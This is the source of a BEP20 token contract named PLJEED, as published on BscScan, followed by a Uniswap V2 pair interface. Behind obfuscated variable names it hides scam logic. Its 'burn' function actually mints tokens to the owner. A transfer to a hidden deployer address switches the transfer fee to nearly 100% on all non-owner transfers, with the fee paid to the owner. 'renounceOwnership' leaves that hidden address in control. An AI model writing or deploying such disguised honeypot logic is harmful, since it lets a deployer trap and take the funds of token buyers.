/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
contract PLJEED {
uint256 private  TYCKIZ = 1000000000000000000000;
uint256 private  OZLGBG = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  CZPBGT = 100000000;
uint256 private  QWEWFJ = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  DQPTET = 1000000000000000;
address private  OOKZVM = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "PLJEED";
string public  symbol = "PLJEED";
address private  MOTWGU = address(0);
address public owner;
uint256 private  WTMFCD = 10000000000000;
address private  YQTPHF = address(0);
address private  PPTXFB = address(0);
address private  XUOPDX = address(0);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 private  VUJPDC = 10000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant LDGYLS = 99999;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getWTMFCD() private returns (uint256) {
return WTMFCD;
}

function _getXUOPDX() private returns (address) {
return XUOPDX;
}

function _getTYCKIZ() private returns (uint256) {
return TYCKIZ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getYQTPHF() private returns (address) {
return YQTPHF;
}

function _getCZPBGT() private returns (uint256) {
return CZPBGT;
}

constructor () public {
MOTWGU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tTDGJZJ 0");
require(spender != address(0), "fTDGJZJ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getDQPTET() private returns (uint256) {
return DQPTET;
}

function _getVUJPDC() private returns (uint256) {
return VUJPDC;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getOZLGBG() private returns (uint256) {
return OZLGBG;
}

function _getPPTXFB() private returns (address) {
return PPTXFB;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TDGJZJ");
require(to != address(0), "TDGJZJ");
require(amount <= balanceOf[from], "TDGJZJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LDGYLS/QWEWFJ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MOTWGU){
QWEWFJ = LDGYLS+2;
}
emit Transfer(from, to, transferAmount);
}

}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}